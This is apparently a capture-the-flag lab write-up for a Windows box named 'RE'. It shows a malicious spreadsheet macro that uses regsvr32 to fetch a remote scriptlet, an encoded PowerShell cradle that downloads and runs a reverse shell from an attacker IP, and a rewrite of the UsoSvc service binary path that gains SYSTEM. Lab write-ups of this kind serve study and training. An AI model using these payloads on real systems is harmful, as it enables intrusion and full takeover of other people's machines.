# Alternative way to exploit RE

## Creating an ODS File without Obfuscation

Instead of obfuscating around _cmd_ and _powershell_ in the **ODS** file the Windows binary _regsvr32_ can also be used to execute code.

Basic macro code:
```basic
Sub Main
  var1 = "regsvr /s /u /i:http://10.10.14.19/shell.sct scrobj.dll"
  Shell(var1)
End Sub
```

Modifying this [SCT file from Atomic-Red-Team](https://github.com/akapv/atomic-red-team/blob/master/atomics/t1117/RegSvr32.sct) _(shell.sct)_ to download _shell.ps1_ via PowerShell:
```markdown
(...)
	<script language="JScript">
		<![CDATA[
			var r = new ActiveXObject("WScript.Shell").Run("powershell -encodedcommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEAOQAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQAKAA==");
(...)
```

After uploading the **ODS** file, it gets processed, executes _shell.ps1_ and the listener on my IP and port 9001 starts a reverse shell session as _luke_.

## Privilege Escalation with IIS User

After getting to the _iis appool_ user, there is a way to escalate privileges to _SYSTEM_ instead of that **Ghidra** part.

When running **Windows Enumeration Scripts**, it finds that the user has permissions over the service _UsoSvc_ because of membership in _NT AUTHORITY\SERVICE_.

Binary path of _UsoSvc_ service:
```markdown
cmd /c "sc qc UsoSvc"
```
```markdown
SERVICE_NAME: UsoSvc
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k netsvcs -p
```

Overwriting the binary path with the function _Invoke-ServiceAbuse_ from [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc):
```markdown
Invoke-ServiceAbuse -ServiceName 'UsoSvc'
```

Overwriting the binary path manually:
```markdown
cmd /c 'sc config UsoSvc binpath="net user Testuser Password123! /add"'

Restart-Service UsoSvc
```

This creates a user called _Testuser_ with the given password, but it is also possible to execute a reverse shell:
```markdown
cmd /c 'sc config UsoSvc binpath="cmd /c powershell -encodedcommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEAOQAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQAKAA=="'

Restart-Service UsoSvc
```

After restarting the service, the listener on my IP and port 9001 starts a reverse shell sessions as _NT Authority\SYSTEM_!
